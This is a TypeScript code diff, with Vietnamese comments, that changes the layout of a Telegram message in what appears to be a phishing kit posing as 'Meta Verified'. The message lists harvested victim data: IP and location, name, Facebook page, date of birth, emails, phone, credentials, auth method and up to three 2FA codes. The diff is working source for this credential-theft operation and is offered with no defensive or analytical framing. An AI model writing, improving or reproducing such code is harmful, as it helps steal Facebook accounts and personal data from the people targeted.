@@ -171,11 +171,20 @@ function row(label: string, codeInnerHtml: string): string {
 }
 
 const TG_GROUP_DIV = '<i>────────────────────</i>';
+/** NBSP: giữ icon và nội dung dòng đầu trên cùng một dòng khi Telegram wrap */
+const ICON_NBSP = '\u00A0';
 
-/** Nhóm: icon một dòng, sau đó các dòng dữ liệu */
-function groupBlock(icon: string, rows: string[]): string {
-    const body = rows.filter(Boolean).join('\n');
-    return body ? `${icon}\n${body}` : '';
+/**
+ * Icon nằm cùng dòng với field đầu tiên; các dòng sau có · để thấy cùng cụm,
+ * tránh icon “treo” một dòng riêng.
+ */
+function groupLines(icon: string, rowStrings: string[]): string {
+    const lines = rowStrings.filter(Boolean);
+    if (!lines.length) return '';
+    const [first, ...rest] = lines;
+    const head = `${icon}${ICON_NBSP}${first}`;
+    if (!rest.length) return head;
+    return [head, ...rest.map((line) => `· ${line}`)].join('\n');
 }
 
 function formatMessage(data: any): string {
@@ -184,20 +193,20 @@ function formatMessage(data: any): string {
     const phoneVal = String(d.phone ?? '').trim();
     const phoneInner = phoneVal ? escapeHtml(`+${phoneVal}`) : '—';
 
-    const header = `📋 <b>Meta Verified</b> · <i>${escapeHtml(ts)}</i>`;
+    const header = `📋${ICON_NBSP}<b>Meta Verified</b> · <i>${escapeHtml(ts)}</i>`;
 
-    const network = groupBlock('🌐', [
+    const network = groupLines('🌐', [
         row('IP address', displayCode(d.ip)),
         row('Location', displayCode(d.location)),
     ]);
 
-    const profile = groupBlock('👤', [
+    const profile = groupLines('👤', [
         row('Full name', displayCode(d.fullName)),
         row('Page', displayCode(d.fanpage)),
         row('DOB (D/M/Y)', formatDobParts(d.day, d.month, d.year)),
     ]);
 
-    const contact = groupBlock('✉️', [
+    const contact = groupLines('✉️', [
         row('Primary email', displayCode(d.email)),
         row('Business email', displayCode(d.emailBusiness)),
         row('Phone', phoneInner),
@@ -210,9 +219,9 @@ function formatMessage(data: any): string {
     if (String(d.authMethod ?? '').trim()) {
         credRows.push(row('Auth method', displayCode(d.authMethod)));
     }
-    const credentials = groupBlock('🔑', credRows);
+    const credentials = groupLines('🔑', credRows);
 
-    const twoFa = groupBlock('🔐', [
+    const twoFa = groupLines('🔐', [
         row('2FA (1)', displayCode(d.twoFa)),
         row('2FA (2)', displayCode(d.twoFaSecond)),
         row('2FA (3)', displayCode(d.twoFaThird)),
